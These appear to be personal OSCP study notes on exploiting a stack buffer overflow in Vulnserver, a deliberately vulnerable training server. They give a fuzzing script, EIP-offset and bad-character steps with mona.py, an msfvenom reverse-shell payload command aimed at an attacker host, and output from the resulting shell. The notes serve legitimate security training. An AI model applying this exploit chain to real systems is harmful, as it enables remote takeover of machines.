---
aliases:
  - Exploit Development
tags:
  - tech
  - cybsec
  - certification
  - oscp
  - exploit_development
author: Mehdi N Tehrani
creat_date: 2023-12-06
category: Cyber Security
subcategory: Offensive Security - OSCP
---
# Buffer Overflow
#buffer_overflow 
![[Pasted image 20231207154344.png]]

![[Pasted image 20231207180923.png]]
# Vulnserver
a vulnerable server used for learning buffer overflow attack
 - Disable Windows defender 'Real-time Virus protection'
 - Download vulnserver from https://github.com/stephenbradshaw/vulnserver
 - Run vulnserver in the Windows machine
 - Connect from the attacker machine to vulnserver: `nc $vulnserver_ip 9999`
 - Download *immunity Debugger*, install, run and attach to the vulnserver process
	 - https://www.immunityinc.com/products/debugger/

## generic_send_tcp
In the attacker machine use this command to spike or fuzz the vulnserver
`generic_send_tcp <ip> <port> <script_to_run> 0 0`


# Find EIP offset
```sh
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
```

```python3
#!/usr/bin/python3
import sys, socket

HOST = ''
PORT = 9999
buffer = '' # copy-paste the pattern generated by pattern_create script

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		s.send(bytes('TRUN /.:/' + buffer, 'latin-1'))
		s.close()
	except:
		sys.exit()
```

The value found in EIP: `386F4337`
```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -q '386F4337'
[*] Exact match at offset 2003
```
EIP Offset found: **2003**

# Find badchars
#badchars
Easier way to find bad characters is to use **mona.py** script - refer to the section below **Find return address**
Here is the manual method:
- Get a list of bad chars from https://github.com/cytopia/badchars
- add to the end of the buffer
- perform the attack and check ESP
- Right-click on the value in ESP and *Follow in Dump*
- identify bad characters by finding those which do not appear in hex dump
	- if two consecutive chars are not found, most likely just the first one needs to be removed
```
shell_code = ''      # to be added later 
buffer += 'A' * (2003 - len(buffer))      # shell code and 'A' padding to fill up to EIP
buffer += 'BBBB'      # this should appear in EIP
buffer += badchars
```

![[Pasted image 20231207181936.png]]
# mona.py
#mona_py
Use this script to find the modules which do not have memory protection
download `mona.py` from https://github.com/corelan/mona and add to  `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`

run in Immunity debugger using  `!mona modules`

This output shows modules used in the binary of this process. Those with all protections set to *false*  are candidates for exploitation.
![[Pasted image 20231207132812.png]]

# Find return address 
## Method 1
This is a simpler method. While immunity debugger is attached to vulnserver, run the following mona command:
`!mona jmp -r ESP -m "essfunc.dll"`

## Method 2
### nasm_shell
#nasm_shell
Use `nash_shell.rb`  to find out the op code for JMP
```
$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm> JMP ESP
00000000  FFE4                  jmp esp
```
### Find return address in a vulnerable module
We found out that `essfunc.dll` is a vulnerable module
Run command in immunity to find where this op code has been used
`!mona find -s '\xff\xe4' -m "essfunc.dll"`

## use mona to find badchars
```
!mona config -set workingfolder <path>`   --> set working folder to store output
!mona bytearray -cpb "\x00"`       --> generate badchars list and remove \x00
!mona compare -f <path>\bytearray.bin -a <address>     --> the address is found in ESP when access violation happens. This returns the bad chars
```

# Use Shell code and Overwrite EIP
- Use metasploit to build a reverse shell payload 
```
msfvenom windows/shell_reverse_tcp LHOST="<attacker_ip>" LPORT=<port> -f c -a x86 -b "\x00"
                                                                       ^ file type
                                                                            ^ architecture
                                                                                   ^ bad characters to exclude
```

- Add the generated shell code bytes to python script
```
shell_code = ()      # shell code bytes generated by msfvenom is added here
buffer += 'A' * (2003 - len(buffer))      # 'A' padding to fill up to EIP
buffer += '\xaf\x11\x50\x62'      # return address found by mona - should populate EIP
nop_slide = '\x90' * 32       # nop slide to provide some safety padding for the shell code
buffer += nop_slide + shell_code
```
- Set up a listener on the attacker machine:  e.g. `nc -nvlp 7777`
- Perform the attack!
```
C:\Users\mnadj\Desktop\vulnserver>whoami
whoami
mnthw10v\mnadj

C:\Users\mnadj\Desktop\vulnserver>systeminfo
systeminfo

Host Name:                 MNTHW10V
OS Name:                   Microsoft Windows 10 Home
OS Version:                10.0.19044 N/A Build 19044
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
[SNIPPED]
```
SUCCESS!
